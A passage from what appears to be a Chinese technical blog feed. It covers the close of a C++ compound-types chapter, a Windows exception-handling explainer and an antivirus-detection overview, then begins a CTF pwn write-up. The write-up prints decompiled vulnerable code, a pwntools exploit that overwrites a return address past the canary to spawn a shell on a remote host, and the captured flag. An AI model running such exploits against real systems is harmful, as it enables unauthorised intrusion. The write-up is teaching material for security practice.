align="left"><code>&lt;vector&gt;</code></td><td align="left"><code>&lt;array&gt;</code></td></tr></tbody></table><p><strong>选择建议:</strong></p><ul><li>  <strong>需要动态大小:</strong> 如果数组大小在运行时才能确定，或者需要在程序运行期间改变大小，**<code>std::vector</code> 是最佳选择**。</li><li><strong>需要固定大小 (编译时已知):</strong> 如果数组大小在编译时就确定且不会改变：<ul><li>  **优先选择 <code>std::array</code> (C++11 及以后)**。它提供了与 C 风格数组相同的性能和内存布局（通常在栈上），但具有更安全、更方便的接口（如 <code>size()</code>, <code>at()</code>, 迭代器）。</li><li>  如果不能使用 C++11 或有特定 C 接口兼容性需求，可以使用 C 风格数组，但要特别注意安全性和大小管理。</li></ul></li><li>  <strong>性能关键且大小固定:</strong> <code>std::array</code> 和 C 风格数组通常性能最佳。</li></ul><p>总的来说，在现代 C++ 中，应优先使用 <code>std::vector</code> 和 <code>std::array</code> 而不是 C 风格数组，以获得更好的类型安全、内存管理和易用性。</p><h2 id="4-11-总结"><a href="#4-11-总结" class="headerlink" title="4.11 总结"></a>4.11 总结</h2><p>本章介绍了C++的**复合类型 (Compound Types)**，它们允许我们将多个值组合成一个数据单元。</p><p>我们首先学习了**数组 (Array)**，它用于存储一系列相同类型的数据。我们了解了如何声明数组、使用索引访问元素（从0开始），以及初始化数组的各种规则，包括C++11引入的更安全的列表初始化方法。我们强调了数组大小必须是常量表达式，并且访问数组时需要注意边界，避免越界访问。</p><p>接着，我们探讨了处理文本数据的两种方式。第一种是传统的<strong>C风格字符串</strong>，即以空字符 <code>\0</code> 结尾的 <code>char</code> 数组。我们学习了如何拼接字符串常量、在数组中使用字符串、以及使用 <code>cin</code> 和 <code>getline</code> 读取字符串输入，并特别注意了混合输入数字和整行字符串时可能遇到的问题。</p><p>第二种，也是C++中更推荐的方式，是使用标准库提供的 <strong><code>string</code> 类</strong>。<code>string</code> 类提供了自动内存管理、方便的赋值、拼接 (<code>+</code>) 和附加 (<code>+=</code>) 操作，以及大量用于查找、修改、比较和访问字符的成员函数。我们还学习了如何使用 <code>cin</code>, <code>cout</code>, 和 <code>getline</code> 对 <code>string</code> 对象进行输入输出，并了解了C++11引入的原始字符串字面值和Unicode字符串字面值。</p><p><strong>结构 (Structure)</strong> 被引入作为一种创建自定义复合类型的方式，允许将不同类型的数据项（成员）组合在一起。我们学习了如何定义结构、声明结构变量、使用点运算符 (<code>.</code>) 访问成员，以及C++11的列表初始化。我们还看到结构体可以包含 <code>string</code> 对象或数组作为成员，结构变量可以相互赋值，可以作为函数参数（按值、按引用、按指针）和返回值。<strong>结构数组</strong>允许我们管理一组结构对象，而<strong>位字段</strong>则提供了一种在结构内精确控制成员占用位数的方式。</p><p><strong>共用体 (Union)</strong> 作为另一种复合类型被介绍，其特点是所有成员共享同一块内存空间，主要用于节省内存或进行类型双关（需谨慎）。我们了解了如何定义和访问共用体，以及使用匿名共用体。</p><p><strong>枚举 (Enum)</strong> 提供了一种创建具名整数常量的方式，提高了代码的可读性和类型安全。我们学习了如何定义枚举、显式设置枚举量的值、枚举的取值范围，并简要介绍了C++11引入的更安全的**作用域内枚举 (<code>enum class</code>)**。</p><p>本章的一个核心内容是<strong>指针 (Pointer)</strong> 和**自由存储空间 (Free Store / Heap)**。指针是存储内存地址的变量。我们学习了如何声明和初始化指针（包括使用 <code>&amp;</code> 获取地址和初始化为 <code>nullptr</code>），如何使用解引用运算符 <code>*</code> 访问指针指向的值，并强调了使用未初始化指针、空指针或悬挂指针的危险。</p><p>我们学习了使用 <code>new</code> 运算符在自由存储区动态分配内存（用于单个变量或对象），以及使用 <code>delete</code> 运算符释放这些内存。同样，我们学习了使用 <code>new[]</code> 动态分配数组，并强调<strong>必须</strong>使用 <code>delete[]</code> 来释放动态数组内存。正确配对 <code>new</code>/<code>delete</code> 和 <code>new[]</code>/<code>delete[]</code> 对于避免内存泄漏和程序崩溃至关重要。</p><p>指针与数组的紧密关系以及<strong>指针算术</strong>也被详细讨论。数组名通常可视为指向第一个元素的指针，指针算术允许在数组元素间移动。我们还看到了如何使用指针处理C风格字符串，以及如何动态创建结构并使用箭头运算符 (<code>-&gt;</code>) 通过指针访问其成员。最后，我们区分了三种主要的存储持续性：自动存储（栈）、静态存储和动态存储（堆）。</p><p>我们还探讨了如何<strong>组合</strong>这些类型，例如创建包含数组或指针成员的结构、指针数组以及指向指针的指针，以构建更复杂的数据表示。</p><p>最后，我们介绍了C++标准库提供的内置数组的现代替代品：**<code>std::vector</code>**（动态大小数组）和 **<code>std::array</code>**（固定大小数组，C++11）。它们提供了更安全、更方便的接口和自动内存管理（对于 <code>vector</code>），是现代C++编程中推荐的选择。</p><p>通过本章的学习，我们掌握了创建和使用各种复合数据类型以及进行动态内存管理的基本技能。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows异常处理机制深度解析</title>
      <link href="2025/03/31/windows_exception/"/>
      <url>2025/03/31/windows_exception/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是Windows异常"><a href="#什么是Windows异常" class="headerlink" title="什么是Windows异常"></a>什么是Windows异常</h2><p>Windows异常是指在程序执行过程中遇到的非正常情况，这些情况会中断程序正常的执行流程。Windows操作系统提供了完善的异常处理机制来应对这些情况，使程序能够优雅地处理错误并尽可能恢复正常运行。</p><p>从本质上看，Windows异常可分为两大类：硬件异常和软件异常。硬件异常由CPU直接产生，如内存访问违规、除零错误等；而软件异常则是由程序代码主动触发，如C++的throw语句、Windows API中的RaiseException函数等。</p><h2 id="常见的异常触发情况及现象"><a href="#常见的异常触发情况及现象" class="headerlink" title="常见的异常触发情况及现象"></a>常见的异常触发情况及现象</h2><p>在日常编程和系统使用中，异常可能由多种情况触发。内存访问违规是一种常见情况，包括访问空指针（0x00000000）、访问已释放的内存或尝试写入只读内存区域。计算异常也时有发生，如除零操作、整数溢出或浮点运算错误。非法指令异常则可能源于执行无效或特权指令，或是错误地执行数据区域的内容。此外，还有程序通过RaiseException API、C++的throw语句或.NET中的throw指令主动抛出的异常。</p><p><img src="https://s2.loli.net/2025/03/31/Zv4nF21k9QtxNm5.jpg" class="lazyload" data-srcset="https://s2.loli.net/2025/03/31/Zv4nF21k9QtxNm5.jpg" srcset="data:image/png;base64,666" alt="exception.jpg"></p><p>这些异常触发时，用户可能会看到不同的现象：应用程序崩溃并显示”XXX已停止工作”的对话框；Windows错误报告工具弹出；程序无预警地终止运行；在调试环境中触发断点；甚至在严重的内核模式异常情况下导致系统蓝屏。这些现象都是Windows异常处理机制工作的外在表现。</p><h2 id="Windows异常处理流程"><a href="#Windows异常处理流程" class="headerlink" title="Windows异常处理流程"></a>Windows异常处理流程</h2><p>当异常发生时，Windows会按照一个严格的顺序尝试处理异常。首先是异常的触发，CPU检测到异常条件并生成中断。如果程序在调试器下运行，调试器拥有第一优先权来处理这个异常，这使开发人员能够在异常发生的第一时间分析问题。</p><p>若无调试器或调试器选择不处理，系统会调用已注册的向量化异常处理函数（Vectored Exception Handlers，VEH）。接下来，如果异常仍未被处理，系统会遍历当前线程的结构化异常处理（Structured Exception Handling，SEH）链，查找能够处理该异常的处理器。</p><p>当SEH链中没有合适的处理器时，系统会调用顶层异常过滤器（UnhandledExceptionFilter函数）作为最后的应用程序级防线。如果所有这些机制都无法处理异常，系统将接管并执行默认处理：显示错误对话框并终止进程。这种层层递进的设计确保了异常能够在最适当的层次被处理，同时提供了多重保障机制。</p><p>即：<code>异常触发 -- 调试器（若存在） -- 已注册的VEH处理函数（影响整个进程） -- 遍历线程的SEH链（影响单个线程） -- 顶层异常过滤器（兜底） -- 系统默认处理</code></p><h2 id="异常处理各环节的作用及区别"><a href="#异常处理各环节的作用及区别" class="headerlink" title="异常处理各环节的作用及区别"></a>异常处理各环节的作用及区别</h2><p>调试器处理是异常处理流程的第一关卡。调试器拥有处理异常的最高优先级，可以在异常发生的第一时间捕获并暂停程序执行。这一环节的独特之处在于它能够展示异常发生时的完整上下文，允许开发者修改程序状态后继续执行。异常在调试器中分为一次机会和二次机会异常，为调试提供了灵活性。</p><p>向量化异常处理（VEH）提供了一种全局性的异常处理机制，其最大特点是不受函数调用堆栈的限制。开发者可以通过AddVectoredExceptionHandler API注册处理函数，系统会按注册顺序或反序调用所有处理函数。VEH特别适合全局错误监控、日志记录等场景，且不需要在代码中添加特殊的语言结构（如try/except）。</p><p>结构化异常处理（SEH）是Windows传统的核心异常处理方式，提供了基于调用栈的异常保护机制。它通过<code>__try/__except/__finally</code>块实现，采用链表结构并与函数调用堆栈紧密关联。SEH遵循”先注册后使用”的LIFO原则，这意味着最近设置的异常处理器会首先被调用。值得一提的是，C++异常处理机制在Windows平台的底层实现也是基于SEH的。</p><p>顶层异常过滤器作为应用程序级别的最后防线，负责处理所有未被捕获的异常。通过SetUnhandledExceptionFilter API，每个进程可以设置一个顶层异常过滤器。这一机制常用于实现崩溃转储功能，是构建自定义应用程序错误报告系统的理想选择。</p><p>当所有用户定义的异常处理器都无法处理异常时，操作系统的默认处理机制接管。系统会显示应用程序错误对话框，可能生成错误报告发送到Microsoft，并终止发生异常的进程，释放其占用的资源。这是保证系统稳定性的最后一道防线。</p><p>通过这种分层的异常处理机制，Windows提供了强大而灵活的错误处理能力，既适合开发人员进行调试，也能为最终用户提供较好的错误恢复体验。对于安全研究人员来说，深入理解这套机制对于漏洞分析和利用同样具有重要意义。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>病毒扫描背后的秘密：从特征码到智能防御的技术揭秘</title>
      <link href="2025/03/31/virus_defence/"/>
      <url>2025/03/31/virus_defence/</url>
      
        <content type="html"><![CDATA[<p>在数字世界中，病毒与杀毒软件的对抗从未停歇。要实现精准的病毒查杀，核心依赖于三大技术：<strong>病毒特征码识别</strong>、<strong>行为监控</strong>以及<strong>启发式分析</strong>。本文将解析这些技术的原理与实现方式，揭开病毒扫描背后的原理。</p><hr><h2 id="病毒扫描的核心：特征码检测"><a href="#病毒扫描的核心：特征码检测" class="headerlink" title="病毒扫描的核心：特征码检测"></a>病毒扫描的核心：特征码检测</h2><h3 id="特征码检测的实现过程"><a href="#特征码检测的实现过程" class="headerlink" title="特征码检测的实现过程"></a>特征码检测的实现过程</h3><p><strong>病毒特征码</strong>是从病毒样本中提取的独特二进制代码片段，通常不超过64字节，可视为病毒的“数字指纹”。特征码检测的实现需要经过以下技术流程：</p><ol><li><p><strong>样本采集与预处理</strong><br>通过沙箱捕获、用户上报或蜜罐系统收集病毒样本。例如，安全厂商VirusTotal每天接收超过100万份可疑文件，经人工分析后提取有效特征码。样本需经过脱壳（如UPX、ASPack等常见壳）、解密等预处理，以获取病毒原始代码。</p></li><li><p><strong>代码逆向与特征定位</strong><br>使用逆向工具（如IDA Pro、Ghidra）分析病毒二进制文件，定位核心功能模块（如感染模块、加密函数）。例如，WannaCry病毒的MS17-010漏洞利用代码段会被标记为关键特征。为确保特征码稳定性，通常会选择代码段（.text节）而非数据段（.data节），避免病毒变种修改数据导致失效。</p></li><li><p><strong>复合特征码生成</strong><br>对多态病毒（如Emotet），需提取多段特征码形成逻辑组合。例如，某勒索病毒的特征码可能包括：</p><ul><li>字符串特征：<code>&quot;This file is encrypted by [家族名]&quot;</code>；</li><li>代码特征：特定API调用序列（如<code>CryptEncrypt</code>→<code>DeleteFile</code>）；</li><li>哈希特征：加密函数所在代码节的SHA-256值。</li></ul></li><li><p><strong>特征码优化与验证</strong><br>使用工具（如MyCCL）进行冲突测试：将特征码插入正常文件，验证是否触发误报。通过模糊哈希（ssdeep）技术降低特征码对微小修改的敏感度，提升对抗变种病毒的能力。</p></li></ol><hr><h2 id="行为监控：实时防御的“动态哨兵”"><a href="#行为监控：实时防御的“动态哨兵”" class="headerlink" title="行为监控：实时防御的“动态哨兵”"></a>行为监控：实时防御的“动态哨兵”</h2><h3 id="行为监控的技术原理"><a href="#行为监控的技术原理" class="headerlink" title="行为监控的技术原理"></a>行为监控的技术原理</h3><p>行为监控不依赖静态特征码，而是通过<strong>钩子（Hook）技术</strong>实时监控程序行为，主要关注以下高危操作：</p><ul><li><strong>文件操作</strong>：短时间内加密大量文件（如勒索病毒行为）；</li><li><strong>进程注入</strong>：将代码写入其他进程内存（如DLL注入）；</li><li><strong>注册表篡改</strong>：修改系统启动项或服务配置；</li><li><strong>网络行为</strong>：异常端口扫描或C2服务器通信。</li></ul><h3 id="实现流程示例（以勒索病毒检测为例）"><a href="#实现流程示例（以勒索病毒检测为例）" class="headerlink" title="实现流程示例（以勒索病毒检测为例）"></a>实现流程示例（以勒索病毒检测为例）</h3><ol><li><p><strong>API监控层</strong><br>通过内核级钩子（如Windows的SSDT Hook）监控<code>CreateFile</code>、<code>WriteFile</code>等文件操作API。当某进程连续调用<code>CreateFile</code>打开100个文档文件，立即触发预警。</p></li><li><p><strong>行为关联分析</strong><br>结合上下文判断操作风险：若该进程同时调用<code>CryptGenKey</code>生成加密密钥，并删除卷影副本（通过<code>vssadmin.exe</code>），则判定为勒索病毒，触发实时拦截。</p></li><li><p><strong>沙箱验证机制</strong><br>对可疑进程进行隔离运行（如Cuckoo沙箱），观察其是否释放加密勒索信（如<code>README.txt</code>），最终确认恶意行为。</p></li></ol><hr><h2 id="启发式分析：未知威胁的“逻辑捕手”"><a href="#启发式分析：未知威胁的“逻辑捕手”" class="headerlink" title="启发式分析：未知威胁的“逻辑捕手”"></a>启发式分析：未知威胁的“逻辑捕手”</h2><h3 id="启发式分析的核心机制"><a href="#启发式分析的核心机制" class="headerlink" title="启发式分析的核心机制"></a>启发式分析的核心机制</h3><p>启发式分析通过预定义规则集对程序进行风险评分，主要检测以下可疑模式：</p><ol><li><p><strong>代码结构异常</strong>  </p><ul><li>PE头信息篡改（如入口点指向资源节）；</li><li>节区段熵值过高（可能经过加密或压缩）；</li><li>导入表异常（如仅依赖<code>LoadLibrary</code>和<code>GetProcAddress</code>动态加载API）。</li></ul></li><li><p><strong>行为模式评分</strong><br>构建评分系统（满分100分），例如：</p><ul><li>创建自启动项：+20分；</li><li>尝试关闭杀毒软件进程：+30分；</li><li>无数字签名且评分超过70分：判定为恶意程序。</li></ul></li><li><p><strong>机器学习模型</strong><br>使用随机森林或神经网络模型，输入特征包括：</p><ul><li>API调用序列（如<code>VirtualAlloc</code>→<code>WriteProcessMemory</code>→<code>CreateRemoteThread</code>的典型注入序列）；</li><li>字符串特征（如硬编码IP地址或域名）；</li><li>代码相似度（与已知病毒家族的代码块匹配度）。</li></ul></li></ol><hr><h2 id="病毒库的高效构建与匹配机制"><a href="#病毒库的高效构建与匹配机制" class="headerlink" title="病毒库的高效构建与匹配机制"></a>病毒库的高效构建与匹配机制</h2><p>病毒库的工程化设计直接影响扫描性能。典型方案包括：</p><ul><li><strong>分库存储</strong>：按特征码哈希首字母划分16个子库，减少遍历次数；</li><li><strong>增量更新</strong>：仅同步新增特征码，避免全量下载占用资源；</li><li><strong>并行处理</strong>：多线程同时扫描文件的不同区段，充分利用多核CPU性能。</li></ul><hr><h2 id="技术演进与未来防御趋势"><a href="#技术演进与未来防御趋势" class="headerlink" title="技术演进与未来防御趋势"></a>技术演进与未来防御趋势</h2><p>当前病毒防御面临两大挑战：</p><ol><li><strong>未知病毒检测</strong>：传统特征码仅能应对已知威胁；</li><li><strong>零日攻击防御</strong>：APT攻击常利用未公开漏洞，绕过常规检测。</li></ol><p>未来技术将向以下方向发展：</p><ul><li><strong>AI与机器学习</strong>：通过训练模型识别恶意代码模式，例如分析API调用序列或内存行为异常；</li><li><strong>云安全协同</strong>：实时共享全球病毒特征数据，构建分布式威胁情报网络；</li><li><strong>主动防御系统</strong>：基于程序行为实时拦截可疑操作，而非依赖事后特征匹配。</li></ul><hr><h2 id="用户防护建议"><a href="#用户防护建议" class="headerlink" title="用户防护建议"></a>用户防护建议</h2><ol><li><strong>选择杀毒软件</strong>：优先考虑病毒库更新频率快、资源占用低的工具；</li><li><strong>系统维护</strong>：定期安装安全补丁，避免漏洞被利用；</li><li><strong>安全意识</strong>：谨慎扫描不明来源的二维码或链接，防止钓鱼攻击。</li></ol><hr><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>病毒防御是技术与意识的双重博弈。尽管特征码技术仍是当前主流，但其局限性催生了行为分析、AI预测等新一代解决方案。用户需在依赖技术防护的同时，保持警惕，方能构筑全面的数字安全防线。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CyberSecurity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSCTF_fresh</title>
      <link href="2024/11/10/xsctf_fresh/"/>
      <url>2024/11/10/xsctf_fresh/</url>
      
        <content type="html"><![CDATA[<h2 id="c-master"><a href="#c-master" class="headerlink" title="c_master"></a>c_master</h2><p><code>请使用简单的C语句对程序进行getshell吧！</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Try to write a C getshell program with my code!</span><br><span class="line">read(0,base,0x8);</span><br><span class="line">write(1,base,0x8);</span><br><span class="line">base+&#x3D;8;</span><br><span class="line">base-&#x3D;8;</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">1024u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try to write a C getshell program with my code!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;read(0,base,0x8);&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;write(1,base,0x8);&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;base+=8;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;base-=8;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;return 0;&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">            __isoc99_scanf(<span class="string">&quot;%128s&quot;</span>, s);</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;read(0,base,0x8);&quot;</span>) )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">            read(<span class="number">0</span>, &amp;v6[v4], <span class="number">8u</span>LL);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;write(1,base,0x8);&quot;</span>) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;output:&quot;</span>);</span><br><span class="line">          write(<span class="number">1</span>, &amp;v6[v4], <span class="number">8u</span>LL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;base+=8;&quot;</span>) )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v4 += <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;base-=8;&quot;</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v4 -= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;return 0;&quot;</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such code...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据输入确定写入数据的地址，那么可以直接将位置定位到main函数的返回地址，写入程序中提供的backdoor函数<br>需要注意程序开了canary，所以要多往后走一次</p><table><thead><tr><th>Low Address</th><th>…</th><th></th></tr></thead><tbody><tr><td></td><td>local var</td><td>&lt;- rsp</td></tr><tr><td></td><td>canary value</td><td>&lt;- rbp-8</td></tr><tr><td></td><td>old rbp</td><td>&lt;- rbp</td></tr><tr><td></td><td>return address</td><td></td></tr><tr><td></td><td>args</td><td></td></tr><tr><td>High Address</td><td>…</td><td></td></tr></tbody></table><p>坑：直接返回到backdoor函数又不可以，需要返回到实际执行system函数的代码地址</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;43.248.97.213&quot;</span>, <span class="number">30483</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;base+=8;&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&quot;base+=8;&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&quot;base+=8;&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&quot;read(0,base,0x8);&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(p64(<span class="number">0x4012c3</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&quot;return 0;&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;p1e4se_bec0me_4_c_m4ster_x5c7f&#125;</code></p><h2 id="rock-paper-scissors"><a href="#rock-paper-scissors" class="headerlink" title="rock_paper_scissors"></a>rock_paper_scissors</h2><p>欢迎来到石头剪刀布！<br>一共进行三十局，你赢了加一分，输了或平局不得分<br>获得十分就算胜利！<br>输入’石头’、’剪刀’或’布’来进行游戏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">28</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> RandomMove; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> userout; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v3 = time(<span class="number">0L</span>L);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402080);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_4020A0);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_4020E6);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402108);</span><br><span class="line">  <span class="keyword">while</span> ( v10 &lt;= <span class="number">9</span> &amp;&amp; v9 &lt;= <span class="number">29</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;byte_402139);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v10 &gt; <span class="number">5</span> )</span><br><span class="line">      gets(v5);</span><br><span class="line">    __isoc99_scanf(&amp;unk_402151, v5);</span><br><span class="line">    userout = stringToMove(v5);</span><br><span class="line">    <span class="keyword">if</span> ( userout == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span 